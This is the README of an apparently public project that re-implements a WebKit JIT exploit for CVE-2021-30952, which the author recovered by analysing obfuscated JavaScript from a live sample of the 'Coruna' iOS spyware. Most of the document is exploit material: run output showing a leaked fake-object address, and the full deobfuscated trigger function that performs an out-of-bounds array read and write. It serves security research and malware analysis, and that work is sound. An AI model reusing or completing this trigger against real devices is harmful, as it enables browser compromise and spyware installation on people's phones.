# coruna-buffout
A work-in-progress re-implementation of the buffout WebKit exploit for CVE-2021-30952 used in the 'Coruna' iOS spyware

Output
```
[+] setting up stuff...
[+] prepping the jit...
[+] jit'd our trigger function
[+] set object
[+] leaked fake obj 0x00000001077a4000
[+] that's all for now!
```

This work is a result of analysing the obfuscated JS files captured from a live sample of the Coruna spyware on an iOS 14 iPhone.

I've determined that the main trigger for this JIT vulnerability is the following function, originally base64 encoded under the `const d` in the sample. It leads to an out of bounds access on the target array `t`.
```C
function jit_me(t, e, r, f, n, i, other_array, nested_idx, u, oob_value) {
        const target_array = t;
        let idx = e;
        const b = f;
        const k = n;
        const d = i;
        const len = target_array.length;

        for (let t = 0; t < 2; t++) {
        if (b === true) {
            if(!(idx === -2147483648)) return -1
        } else if (!(idx > 2147483647)) return -2;

        if (k === 0) idx = 0;

        if (idx < len) {
            if (k !== 0) idx -= 2147483647-7;
            
            if (idx < 0) return -3;

            // target_array[idx] = 2.66289667873244264257e-314;
            let t = target_array[idx]; // read the leaked data from t[201] array
            if (d) {
                target_array[idx] = r;

                if (u === 0) t = other_array[nested_idx][0];
                else other_array[nested_idx][0] = oob_value
                }
                return t
            }
            if( t > 0 ) break
            }
            return-4
        }
```
